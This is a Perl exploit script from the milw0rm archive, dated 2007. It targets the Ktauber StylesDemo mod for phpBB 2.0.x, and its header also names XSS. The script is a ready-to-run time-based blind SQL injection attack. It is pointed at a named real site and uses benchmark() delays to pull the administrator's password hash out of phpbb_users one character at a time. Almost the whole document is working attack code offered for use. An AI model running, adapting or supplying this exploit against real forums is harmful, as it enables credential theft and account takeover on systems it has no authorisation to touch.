#---------------------------------------------------------------
# ____            __________         __             ____  __   
#/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
# |   |/    \    |  | _(__  <_/ ___\   __\  ______  |   \   __\
# |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
# |___|___|  /\__|  /______  /\___  >__|            |___||__|  
#          \/\______|      \/     \/                           
#---------------------------------------------------------------
#
#Http://www.inj3ct-it.org	    Staff[at]inj3ct-it[dot]org	
#
#--------------------------------------------------------------
#
#Ktauber.com StylesDemo Mod for phpbb 2.0.xx Multiple Vulnerabilites
#
#---------------------------------------------------------------
#
# Coded by nexen
#
# GreetZ: Rossi46go for code 
#
# Description:
#
#XSS and SQL Injection
#
#---------------------------------------------------------------
#
#
#
#
#---------------------------------------------------------------
#exploit.pl
#---------------------------------------------------------------
#
#
#
use LWP::UserAgent;
use HTTP::Request::Common;
use Time::HiRes;
######################################## CONFIGURAZIONE EXPLOIT ##########################################################################
$sito = "http://www.forumup.com/stylesdemo/"; # insert vulnerable site as http://[site]/[path]/
##########################################################################################################################################
$var = "1";
my $hash;
@array = (48,49,50,51,52,53,54,55,56,57,97,98,99,100,101,102);

sub richiesta {
$var = $_[0];
$ua = LWP::UserAgent->new;
$inizio=Time::HiRes::time();
$response = $ua->request(GET $var,
s => $var);
$response->is_success() || print("$!\n");
$fine=Time::HiRes::time();
$tempo=$fine-$inizio;
return $tempo
}

sub aggiorna{
system("cls");
print "Tempo sql : " . $_[4] . " secondi\n";
print "Hash : " . $_[3] . "\n";
}

#print richiesta;

for ($i=1;$i<33;$i++)
{
for ($j=0;$j<16;$j++)
{

$var=$sito."index.php?s=(SELECT IF((ASCII(SUBSTRING(`user_password`,".$i.",1))=".$array[$j]."),benchmark(200000000,CHAR(0)),0) FROM phpbb_users WHERE `user_id`=2)/*";
$tempo=richiesta($var);
aggiorna($host,$tempodefault,$j,$hash,$tempo,$i);
if($tempo>9)
{
$tempo=richiesta($var);
aggiorna($host,$tempodefault,$j,$hash,$tempo,$i);
if($tempo>9)
{
$hash .=chr($array[$j]);
aggiorna($host,$tempodefault,$j,$hash,$tempo,$i);
$j=200;
}
}

}
if($i==1)
{
if($hash eq "")
{
$i=200;
print "Attacco Fallito Sito Fixato\n";
}
}
}


print "Attacco Terminato\n\n";

system("pause");

# milw0rm.com [2007-09-18]
